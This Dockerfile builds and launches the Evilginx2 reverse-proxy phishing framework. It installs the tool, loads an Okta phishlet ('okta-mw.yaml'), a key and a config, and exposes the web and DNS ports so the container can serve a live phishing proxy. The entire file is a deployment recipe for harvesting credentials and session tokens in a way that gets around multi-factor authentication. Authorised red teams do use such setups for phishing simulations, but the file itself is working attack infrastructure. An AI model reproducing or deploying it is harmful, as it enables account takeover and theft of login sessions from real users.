FROM golang:1.18.0 as go-build

ENV EVILGINX2_VERSION 2.4.0

RUN apt-get update && apt-get install -y unzip python3 python3-pip

RUN wget https://github.com/kgretzky/evilginx2/releases/download/${EVILGINX2_VERSION}/evilginx-linux-amd64.tar.gz

RUN tar xzvf evilginx-linux-amd64.tar.gz

WORKDIR /go/evilginx

RUN ./install.sh

RUN mkdir keys

COPY ./keys/EvilGinx.pem ./keys

COPY ./phishlets/okta-mw.yaml ./phishlets

RUN mkdir config

COPY config.yaml ./config

COPY init.sh .

RUN chmod +x init.sh

RUN mkdir /root/.ssh

#RUN ssh-keygen -f keys/EvilGinx.pem > /root/.ssh/authorized_keys

EXPOSE 443
 
EXPOSE 53

EXPOSE 80

CMD ["./evilginx", "-p", "/go/evilginx/phishlets", "-c", "/go/evilginx/config"]

# ENTRYPOINT [ "/go/evilginx/init.sh" ]